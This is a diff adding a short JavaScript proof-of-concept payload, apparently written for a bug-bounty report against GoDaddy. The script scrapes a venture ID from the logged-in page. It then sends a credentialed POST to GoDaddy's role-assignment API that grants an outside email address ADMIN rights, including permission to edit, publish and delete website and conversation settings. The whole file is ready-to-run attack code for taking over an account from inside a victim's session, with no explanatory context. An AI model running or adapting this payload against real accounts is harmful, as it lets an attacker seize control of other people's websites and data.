@@ -1,0 +1,16 @@
+var xhr = new XMLHttpRequest();
+var getresourceId = document.body.innerHTML.match(/"ventureId"\s*:\s*"([^"]+)"/)?.[1];
+console.log(getresourceId);
+xhr.open("POST", "https://api.godaddy.com/v2/roles/assignees", true);
+xhr.setRequestHeader("User-Agent", 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0');
+xhr.setRequestHeader("Accept", '*/*');
+xhr.setRequestHeader("Accept-Language", 'en-US,en;q=0.9');
+xhr.setRequestHeader("Accept-Encoding", 'gzip, deflate, br');
+xhr.setRequestHeader("Content-Type", 'application/json');
+xhr.setRequestHeader("Content-Length", '331');
+xhr.setRequestHeader("Origin", 'https://dashboard.godaddy.com');
+xhr.setRequestHeader("Sec-Fetch-Dest", 'empty');
+xhr.setRequestHeader("Sec-Fetch-Mode", 'cors');
+xhr.setRequestHeader("Sec-Fetch-Site", 'same-site');
+xhr.withCredentials = true;
+xhr.send('{"permissionsToInclude":["conversation_manage_settings","conversation_reply","conversation_delete","package_view_and_manage_roles_users","website_edit","website_publish"],"userName":"asdasd","userEmail":"inimaill@wearehackerone.com","resourceId":"'+getresourceId+'","resourceType":"venture","defaultRole":"ADMIN"}');
